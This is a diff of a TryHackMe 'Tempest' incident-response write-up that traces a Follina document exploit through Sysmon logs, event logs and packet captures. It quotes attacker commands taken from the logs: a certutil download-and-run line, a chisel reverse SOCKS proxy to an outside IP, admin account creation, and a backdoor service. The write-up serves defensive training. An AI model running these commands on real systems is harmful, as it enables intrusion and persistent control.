@@ -1,12 +1,12 @@
 # [TryHackMe - Tempest](https://tryhackme.com/room/tempestincident)
-![43476f53edc80d36edc93ee4d13f54a7.png](../../_resources/43476f53edc80d36edc93ee4d13f54a7.png)
+![43476f53edc80d36edc93ee4d13f54a7.png](/resources/43476f53edc80d36edc93ee4d13f54a7.png)
 ***
 [toc]
 ***
 ## Preparation - Tools and Artifacts
 >What is the SHA256 hash of the capture.pcapng file?
 
-![1ef6cbb3d500fc7f84f50c3f2c9dd643.png](../../_resources/1ef6cbb3d500fc7f84f50c3f2c9dd643.png)
+![1ef6cbb3d500fc7f84f50c3f2c9dd643.png](/resources/1ef6cbb3d500fc7f84f50c3f2c9dd643.png)
 
 After started the machine we can either use `certutil` or `Get-Filehash` cmdlet to generate SHA256 hash of all evidences we got to confirm its integrity (be able to submit the hash meaning that there is no modification on these evidence)
 
@@ -24,15 +24,15 @@ CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
 D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
 ```
 
-![5531c4d901d20c0ec1f221c269eae4a0.png](../../_resources/5531c4d901d20c0ec1f221c269eae4a0.png)
+![5531c4d901d20c0ec1f221c269eae4a0.png](/resources/5531c4d901d20c0ec1f221c269eae4a0.png)
 
 Now we have to prepare each evidence, first we can parse sysmon log to csv file.
 
-![955a4657bee7ec5c7176f58a0c82259a.png](../../_resources/955a4657bee7ec5c7176f58a0c82259a.png)
+![955a4657bee7ec5c7176f58a0c82259a.png](/resources/955a4657bee7ec5c7176f58a0c82259a.png)
 
 Next is windows.evtx which is actually Security log.
 
-![3789d963ec0339de0bd5573f0dcd96d9.png](../../_resources/3789d963ec0339de0bd5573f0dcd96d9.png)
+![3789d963ec0339de0bd5573f0dcd96d9.png](/resources/3789d963ec0339de0bd5573f0dcd96d9.png)
 
 You can even save event log as xml for SysmonView (personally I would still use csv with Timeline Explorer) but now we are ready for the investigation.
 
@@ -61,7 +61,7 @@ Significant Data Sources:
 
 >The user of this machine was compromised by a malicious document. What is the file name of the document?
 
-![9292c0a678994409b6a66814f4243f0f.png](../../_resources/9292c0a678994409b6a66814f4243f0f.png)
+![9292c0a678994409b6a66814f4243f0f.png](/resources/9292c0a678994409b6a66814f4243f0f.png)
 
 Lets start by filter for a simple keyword such as "doc" and focus on the Google Chrome image which we can see that there is only 1 doc file was created during the incident and this file served as the initial access for the attacker.
 
@@ -72,7 +72,7 @@ free_magicules.doc
 >What is the name of the compromised user and machine?
 <br>*Format: username-machine name*
 
-![eebba83f509c866aefabf06f348c3db3.png](../../_resources/eebba83f509c866aefabf06f348c3db3.png)
+![eebba83f509c866aefabf06f348c3db3.png](/resources/eebba83f509c866aefabf06f348c3db3.png)
 
 We can take a look at "User Name" field after filter with Event ID 1 then we can see that user that downloaded and executed malicious document file is benimaru from TEMPEST machine (yes this room is based on Tensei shitara Slime Datta Ken)
 
@@ -82,7 +82,7 @@ benimaru-TEMPEST
 
 >What is the PID of the Microsoft Word process that opened the malicious document?
 
-![d673b0c8b1dcea5c9a85acfe055af98c.png](../../_resources/d673b0c8b1dcea5c9a85acfe055af98c.png)
+![d673b0c8b1dcea5c9a85acfe055af98c.png](/resources/d673b0c8b1dcea5c9a85acfe055af98c.png)
 
 Lets take a look at the Microsoft word process (`winword.exe`) which we can see that it was executed at 2022-06-22 17:13:12 with Process ID 496 to opened malicious document file.
 
@@ -92,7 +92,7 @@ Lets take a look at the Microsoft word process (`winword.exe`) which we can see 
 
 >Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
 
-![9d0b1631afa95af41ded6cfbca1e15aa.png](../../_resources/9d0b1631afa95af41ded6cfbca1e15aa.png)
+![9d0b1631afa95af41ded6cfbca1e15aa.png](/resources/9d0b1631afa95af41ded6cfbca1e15aa.png)
 
 Now we can use Process ID that we just found to filter along with Event ID 22 for DNS query event which we can see that beside `office.com` domain, there is 1 suspicious domain was queried by this process which is phishteam[.]xyz which was mapped with 167.71.199.191  
 
@@ -102,7 +102,7 @@ Now we can use Process ID that we just found to filter along with Event ID 22 fo
 
 >What is the base64 encoded string in the malicious payload executed by the document?
 
-![b5caa50a2db8aa34c5e99fb0dcec7a55.png](../../_resources/b5caa50a2db8aa34c5e99fb0dcec7a55.png)
+![b5caa50a2db8aa34c5e99fb0dcec7a55.png](/resources/b5caa50a2db8aa34c5e99fb0dcec7a55.png)
 
 Now we have to go back to Event ID 1 and use process ID 496 as parent process ID which we can see that there is only 1 child process from Microsoft Word process and as we can see from the command line of this process, then we could also see that this is an exploitation attempt on Microsoft Support Diagnostic Tool (`msdt.exe`) to execute PowerShell command.
 
@@ -113,7 +113,7 @@ JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFw
 >What is the CVE number of the exploit used by the attacker to achieve a remote code execution? <br>
 *Format: XXXX-XXXXX*
 
-![b2a82da5b3e69c99e0a85954723f2dec.png](../../_resources/b2a82da5b3e69c99e0a85954723f2dec.png)
+![b2a82da5b3e69c99e0a85954723f2dec.png](/resources/b2a82da5b3e69c99e0a85954723f2dec.png)
 
 By doing a quick google search, we can see that the payload that we just found is the exploitation of CVE-2022-30190 a.k.a "Follina" and this vulnerability allows an attacker to execute arbitrary code on the target system upon opening of the crafted document file.
 
@@ -143,15 +143,15 @@ Significant Data Sources:
 
 >The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
 
-![c41e23df55ff15a6b6ae27ffa75e2f20.png](../../_resources/c41e23df55ff15a6b6ae27ffa75e2f20.png)
+![c41e23df55ff15a6b6ae27ffa75e2f20.png](/resources/c41e23df55ff15a6b6ae27ffa75e2f20.png)
 
 We can use CyberChef to decode it (or just decode it using base64 binary on the attack box) but at the end, we will have these PowerShell command to download `update.zip` from previously found domain to user's Startup folder, Uncompressed it and then remove the zip file from the system.  
 
-![08eda686a537926d3c557ae6adadd950.png](../../_resources/08eda686a537926d3c557ae6adadd950.png)
+![08eda686a537926d3c557ae6adadd950.png](/resources/08eda686a537926d3c557ae6adadd950.png)
 
 We can filter for Event ID 11 and "Start" string for Startup folder which we can see that this file was really created on the user's startup folder.
 
-![13422973c344a76cbafbe83adc92a7a8.png](../../_resources/13422973c344a76cbafbe83adc92a7a8.png)
+![13422973c344a76cbafbe83adc92a7a8.png](/resources/13422973c344a76cbafbe83adc92a7a8.png)
 
 Then we can see another file dropped on the Startup folder which is the file that was extracted from the zip file and its shortcut file which could be used to embedded system command to be executed upon user logon.
 
@@ -162,11 +162,11 @@ C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 >The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user? <br>
 *Format: Remove the double quotes from the log.*
 
-![e9dade2193175fafd3be6591b409e0ee.png](../../_resources/e9dade2193175fafd3be6591b409e0ee.png)
+![e9dade2193175fafd3be6591b409e0ee.png](/resources/e9dade2193175fafd3be6591b409e0ee.png)
 
 Now we can focus on Event ID 1 from benimaru user which we can see that after user logged on into the system (indicate by `winlogon.exe` process) then we can see PowerShell command to execute certutil to download `first.exe` from maliciously found domain and executed the file afterward. 
 
-![e8a81e9d71ef9f35cb77fce4c8197d61.png](../../_resources/e8a81e9d71ef9f35cb77fce4c8197d61.png)
+![e8a81e9d71ef9f35cb77fce4c8197d61.png](/resources/e8a81e9d71ef9f35cb77fce4c8197d61.png)
 
 Then we can see that after `first.exe` was executed, several enumeration commands were executed as child of this process so `first.exe` is the second payload and its payload responsible for reverse shell connection to the attacker C2.
 
@@ -176,7 +176,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certut
 
 >Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
 
-![c38feabf18884d0f81e9b408185c947a.png](../../_resources/c38feabf18884d0f81e9b408185c947a.png)
+![c38feabf18884d0f81e9b408185c947a.png](/resources/c38feabf18884d0f81e9b408185c947a.png)
 
 We can check out the event that `first.exe` was executed to get hash of this file right here.
 
@@ -187,11 +187,11 @@ CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
 >The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker? <br>
 *Format: domain:port*
 
-![25376c38c1cc49ee436c7bdccf8f9a4a.png](../../_resources/25376c38c1cc49ee436c7bdccf8f9a4a.png)
+![25376c38c1cc49ee436c7bdccf8f9a4a.png](/resources/25376c38c1cc49ee436c7bdccf8f9a4a.png)
 
 We must combine to result from Event ID 3 with Event ID 22, firstly we have the different IP address from the one we found on malicious document and the port that was used for this connection is 80.
 
-![4ce30918fc578ce9a559d4e741b5ff05.png](../../_resources/4ce30918fc578ce9a559d4e741b5ff05.png)
+![4ce30918fc578ce9a559d4e741b5ff05.png](/resources/4ce30918fc578ce9a559d4e741b5ff05.png)
 
 Now, we can proceed with Event ID 22 to get the domain and it is also different domain from the one we found as well.
 
@@ -219,7 +219,7 @@ Data Sources:
 
 >What is the URL of the malicious payload embedded in the document?
 
-![7ec2fb077befca23962a0b46ea239932.png](../../_resources/7ec2fb077befca23962a0b46ea239932.png)
+![7ec2fb077befca23962a0b46ea239932.png](/resources/7ec2fb077befca23962a0b46ea239932.png)
 
 Now we can open pcap file with brim and utilized given filter with our previously found domain which we will see that first stage payload was connected `index.html` from this domain as indicates by the User Agent - Microsoft Office Word 2014
 
@@ -229,19 +229,19 @@ http://phishteam.xyz/02dcf07/index.html
 
 >What is the encoding used by the attacker on the c2 connection?
 
-![58be19819585eab31051e8222e3cef60.png](../../_resources/58be19819585eab31051e8222e3cef60.png)
+![58be19819585eab31051e8222e3cef60.png](/resources/58be19819585eab31051e8222e3cef60.png)
 
 We can open pcap with Wireshark and utilzed Export HTTP object list feature to jump right into the first C2 stream, noticed that we also have C2 connection on port 8080 in later stage as well.
 
-![331c29cd78b4221c83adc1c3f7e6a355.png](../../_resources/331c29cd78b4221c83adc1c3f7e6a355.png)
+![331c29cd78b4221c83adc1c3f7e6a355.png](/resources/331c29cd78b4221c83adc1c3f7e6a355.png)
 
 Then we can inspect any of stream that sending HTTP request to C2 which we can see that C2 response back with base64 encoding and the C2 is hosting using Python.  
 
-![147d5f47f785f75cd625c1ff38d620f9.png](../../_resources/147d5f47f785f75cd625c1ff38d620f9.png)
+![147d5f47f785f75cd625c1ff38d620f9.png](/resources/147d5f47f785f75cd625c1ff38d620f9.png)
 
 After decoding it then we will have `whoami` as the first command executed after an establishment of C2 connection.
 
-![fd83b876931abf7ed69b51470d6137e5.png](../../_resources/fd83b876931abf7ed69b51470d6137e5.png)
+![fd83b876931abf7ed69b51470d6137e5.png](/resources/fd83b876931abf7ed69b51470d6137e5.png)
 
 and it matches what we have from sysmon log as well.
 
@@ -251,11 +251,11 @@ base64
 
 >The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
 
-![fcfd7b1095476bfc3872931dfcc3540e.png](../../_resources/fcfd7b1095476bfc3872931dfcc3540e.png)
+![fcfd7b1095476bfc3872931dfcc3540e.png](/resources/fcfd7b1095476bfc3872931dfcc3540e.png)
 
 Go back to Brim and change filter to another domain which we can see that the infected host sending response back to C2 via GET command with `q` parameter on `/9ab62b5` and we also notice the user agent that indicates that the C2 binary was compiled with Nim.
 
-![16551f3093d8c44d07e561a35ced85c1.png](../../_resources/16551f3093d8c44d07e561a35ced85c1.png)
+![16551f3093d8c44d07e561a35ced85c1.png](/resources/16551f3093d8c44d07e561a35ced85c1.png)
 
 Now we can copy either one of value to decode then we can confirm that the result also encoded with base64 as well.
 
@@ -304,15 +304,15 @@ Significant Data Sources:
 
 >The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
 
-![a6ff7b989de3ac2ed536abbe10731a30.png](../../_resources/a6ff7b989de3ac2ed536abbe10731a30.png)
+![a6ff7b989de3ac2ed536abbe10731a30.png](/resources/a6ff7b989de3ac2ed536abbe10731a30.png)
 
 After took a look at Sysmon event again, there is nothing about discovering of a file at all so we can only get this after decoding result sending back to C2 but we can still see something as the attacker also downloaded 3 additional files and executed command via WinRM and the command line argument of `ch.exe` make me 100% sure that this is chisel so the attacker does port forwarding and then gained access to the system via WinRM later to continue the operation.
 
-![7689384f9e4d76f1b1014294d9e49850.png](../../_resources/7689384f9e4d76f1b1014294d9e49850.png)
+![7689384f9e4d76f1b1014294d9e49850.png](/resources/7689384f9e4d76f1b1014294d9e49850.png)
 
 Now we can sort by timestamp and get all the requested URI sending to C2 server (using tcpdump is better this way)
 
-![16474e60b0a1daa672a8770d02445b01.png](../../_resources/16474e60b0a1daa672a8770d02445b01.png)
+![16474e60b0a1daa672a8770d02445b01.png](/resources/16474e60b0a1daa672a8770d02445b01.png)
 
 After decoding them with CyberChef, now we can see that the attacker found password of benimaru user on `automation.ps1` script.
 
@@ -322,7 +322,7 @@ infernotempest
 
 >The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
 
-![62bfaaf1f74d01507e0d9bbefc567126.png](../../_resources/62bfaaf1f74d01507e0d9bbefc567126.png)
+![62bfaaf1f74d01507e0d9bbefc567126.png](/resources/62bfaaf1f74d01507e0d9bbefc567126.png)
 
 As we found from the sysmon log earlier that the attacker successfully connected to infected system via WinRM after port forwarding with Chisel then we can see that the attacker actually used `netstat -ano -p tcp` to list all TCP connection which we can see that port 5985 which is the default port for WinRM was running on the local.
 
@@ -333,7 +333,7 @@ As we found from the sysmon log earlier that the attacker successfully connected
 >The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection? <br>
 *Format: Remove the double quotes from the log.*
 
-![b3a842c95492870da53cff4ecdf22c8c.png](../../_resources/b3a842c95492870da53cff4ecdf22c8c.png)
+![b3a842c95492870da53cff4ecdf22c8c.png](/resources/b3a842c95492870da53cff4ecdf22c8c.png)
 
 ```
 C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
@@ -341,7 +341,7 @@ C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
 
 >What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
 
-![dac43eace7caff1df9296617cf9d6c94.png](../../_resources/dac43eace7caff1df9296617cf9d6c94.png)
+![dac43eace7caff1df9296617cf9d6c94.png](/resources/dac43eace7caff1df9296617cf9d6c94.png)
 
 Now its time to confirm that it is really chisel, we can grab it SHA256 right here.
 
@@ -351,7 +351,7 @@ Now its time to confirm that it is really chisel, we can grab it SHA256 right he
 
 >What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
 
-![c12421fb3f756ef991a850ecb729f620.png](../../_resources/c12421fb3f756ef991a850ecb729f620.png)
+![c12421fb3f756ef991a850ecb729f620.png](/resources/c12421fb3f756ef991a850ecb729f620.png)
 
 Searching it on [VirusTotal](https://www.virustotal.com/gui/file/8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451) confirming that the tool used by attacker for reverse socks proxy is chisel
 
@@ -362,11 +362,11 @@ chisel
 >The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate? <br>
 *Format: Answer in lowercase*
 
-![7c178339fb4011b21a5519e7f1bcfb6f.png](../../_resources/7c178339fb4011b21a5519e7f1bcfb6f.png)
+![7c178339fb4011b21a5519e7f1bcfb6f.png](/resources/7c178339fb4011b21a5519e7f1bcfb6f.png)
 
 As we found earlier that the attacker connected to the infected system via WinRM, the attacker then proceeded to get all access tokens on the current session.
 
-![ddd696d1e5fb59eb2bd2ecec98228366.png](../../_resources/ddd696d1e5fb59eb2bd2ecec98228366.png)
+![ddd696d1e5fb59eb2bd2ecec98228366.png](/resources/ddd696d1e5fb59eb2bd2ecec98228366.png)
 
 Which we can see that the attacker had all privilege in the world to compromise the machine and the easiest way is to exploit SeImpersonatePrivilege to get interactive shell as SYSTEM.
 
@@ -392,23 +392,23 @@ Significant Data Sources:
 >After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary? <br>
 *Format: binary name,SHA256 hash*
 
-![8c5c7ab58fbfa27c4e069d30833cded9.png](../../_resources/8c5c7ab58fbfa27c4e069d30833cded9.png)
+![8c5c7ab58fbfa27c4e069d30833cded9.png](/resources/8c5c7ab58fbfa27c4e069d30833cded9.png)
 
 Following the trail of execution, we can see that after realized all access tokens he got then the attacker downloaded 2 additional files to infected system.
 
-![99aa791274028314e47b07aa14a1a17b.png](../../_resources/99aa791274028314e47b07aa14a1a17b.png)
+![99aa791274028314e47b07aa14a1a17b.png](/resources/99aa791274028314e47b07aa14a1a17b.png)
 
 One does seem to be the abuse of SeImpersonatePrivilege and the other one is the last payload for reverse shell connection.
 
-![5c799b208371cc699fbdf7af5aa571a6.png](../../_resources/5c799b208371cc699fbdf7af5aa571a6.png)
+![5c799b208371cc699fbdf7af5aa571a6.png](/resources/5c799b208371cc699fbdf7af5aa571a6.png)
 
 Lets grab the file hash of the `spf.exe` first which we can see that this process still running as benimaru
 
-![8f97324cfe27aa0030d5d01d9d0b162a.png](../../_resources/8f97324cfe27aa0030d5d01d9d0b162a.png)
+![8f97324cfe27aa0030d5d01d9d0b162a.png](/resources/8f97324cfe27aa0030d5d01d9d0b162a.png)
 
 But the `final.exe` was executed as SYSTEM, so the attacker successfully archived SYSTEM privilege via Token Impersonation.
 
-![a4808ca55f83d2bab12071be9d9362a1.png](../../_resources/a4808ca55f83d2bab12071be9d9362a1.png)
+![a4808ca55f83d2bab12071be9d9362a1.png](/resources/a4808ca55f83d2bab12071be9d9362a1.png)
 
 Just to make sure, we can submit the hash to [VirusTotal](https://www.virustotal.com/gui/file/8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d) which reveal that this is the PrintSpoofer, the binary designed to abuse SeImpersonatePrivilege.
 
@@ -419,7 +419,7 @@ spf.exe,8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
 >Based on the SHA256 hash of the binary, what is the name of the tool used? <br>
 *Format: Answer in lowercase*
 
-![19be3b2332e4702e90f95090aabc1f16.png](../../_resources/19be3b2332e4702e90f95090aabc1f16.png)
+![19be3b2332e4702e90f95090aabc1f16.png](/resources/19be3b2332e4702e90f95090aabc1f16.png)
 https://github.com/itm4n/PrintSpoofer
 
 ```
@@ -433,7 +433,7 @@ SeImpersonatePrivilege
 
 >Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
 
-![24772dc171c917e043efe16f3574fdf7.png](../../_resources/24772dc171c917e043efe16f3574fdf7.png)
+![24772dc171c917e043efe16f3574fdf7.png](/resources/24772dc171c917e043efe16f3574fdf7.png)
 
 We know that `final.exe` has to be the final payload as its name imply so we can filter for Event ID 3 which we can see that it was indeed connected to the attacker C2 on port 8080 as found from the network capture file as well.
 
@@ -468,11 +468,11 @@ Significant Data Sources:
 >Upon achieving SYSTEM access, the attacker then created two users. What are the account names? <br>
 *Format: Answer in alphabetical order - comma delimited*
 
-![822fcc7fb3a612cbf8e6b49386b4f6a8.png](../../_resources/822fcc7fb3a612cbf8e6b49386b4f6a8.png)
+![822fcc7fb3a612cbf8e6b49386b4f6a8.png](/resources/822fcc7fb3a612cbf8e6b49386b4f6a8.png)
 
 Lets take a look at sysmon log again and we can filter for "first.exe" to get all Event ID 1 events related to this binary which we can see that there are 2 users were added to the system, Administrator password was changed, malicious service was created and one of user was added to administrators group
 
-![1803d4341379dd0b9407583a5234ef09.png](../../_resources/1803d4341379dd0b9407583a5234ef09.png)
+![1803d4341379dd0b9407583a5234ef09.png](/resources/1803d4341379dd0b9407583a5234ef09.png)
 
 We can go back to decoded command result which we can see that these actions were successful.
 
@@ -482,7 +482,7 @@ Shion,Shuna
 
 >Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
 
-![d2ae7985b333628087e098d393595670.png](../../_resources/d2ae7985b333628087e098d393595670.png)
+![d2ae7985b333628087e098d393595670.png](/resources/d2ae7985b333628087e098d393595670.png)
 
 But take a look at the result again, we found that it was not working right of the batch but the attacker forgot to use `/add` to create new user (by using `net` command with user and password mean that we want to change password of existing user.)
 
@@ -492,7 +492,7 @@ But take a look at the result again, we found that it was not working right of t
 
 >Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
 
-![16628ca774835c4da49aa0a21d5cd4f3.png](../../_resources/16628ca774835c4da49aa0a21d5cd4f3.png)
+![16628ca774835c4da49aa0a21d5cd4f3.png](/resources/16628ca774835c4da49aa0a21d5cd4f3.png)
 
 We can utilized Security log and as we might remember when we parsed this log, we got 2 events from Event ID 4720 for new user creation and we can see that shuna has SID of 1002 while shion has SID of 1003 in order on user creation (so the room creator favor Shuna more than Shion?)
 
@@ -502,11 +502,11 @@ We can utilized Security log and as we might remember when we parsed this log, w
 
 >The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
 
-![a5907ed60fc49ef1e4e4ffb31a3b7f89.png](../../_resources/a5907ed60fc49ef1e4e4ffb31a3b7f89.png)
+![a5907ed60fc49ef1e4e4ffb31a3b7f89.png](/resources/a5907ed60fc49ef1e4e4ffb31a3b7f89.png)
 
 Oh nevermind, the room creator *cough cough* the attacker might be the Shion's fanboy since the attacker added Shion to administrators group.
 
-![bf9d446c84eaf1c29d3cff8031798820.png](../../_resources/bf9d446c84eaf1c29d3cff8031798820.png)
+![bf9d446c84eaf1c29d3cff8031798820.png](/resources/bf9d446c84eaf1c29d3cff8031798820.png)
 
 We can confirm the same command from result sending to C2 as well. (now Shion can sleep with Rimuru)
 
@@ -516,7 +516,7 @@ net localgroup administrators /add shion
 
 >Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
 
-![f2812af08e6e3cc6af9164299c2bd457.png](../../_resources/f2812af08e6e3cc6af9164299c2bd457.png)
+![f2812af08e6e3cc6af9164299c2bd457.png](/resources/f2812af08e6e3cc6af9164299c2bd457.png)
 
 We can filter for Event ID 4732 for "A member was added to a security-enabled local group" which we can see that SID of Shion was really displayed on this event.
 
@@ -527,11 +527,11 @@ We can filter for Event ID 4732 for "A member was added to a security-enabled lo
 >After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this? <br>
 *Format: Remove the double quotes from the log.*
 
-![c29c65882c8fff34a4dbdc08a2516962.png](../../_resources/c29c65882c8fff34a4dbdc08a2516962.png)
+![c29c65882c8fff34a4dbdc08a2516962.png](/resources/c29c65882c8fff34a4dbdc08a2516962.png)
 
 We also see that there are 2 attempts to create backdoor service with binary path of `final.exe`
 
-![cb48e7905098b86198ba4324e0f780b3.png](../../_resources/cb48e7905098b86198ba4324e0f780b3.png)
+![cb48e7905098b86198ba4324e0f780b3.png](/resources/cb48e7905098b86198ba4324e0f780b3.png)
 
 But only the second command was successful due to the "TempestUpdate" service was already existed. 
 
@@ -539,7 +539,7 @@ But only the second command was successful due to the "TempestUpdate" service wa
 C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
 ```
 
-![f697fabdcf17e1233619983499bb0b54.png](../../_resources/f697fabdcf17e1233619983499bb0b54.png)
+![f697fabdcf17e1233619983499bb0b54.png](/resources/f697fabdcf17e1233619983499bb0b54.png)
 
 Now we are done with the plan to make Shion a Rimuru's wife
 ***
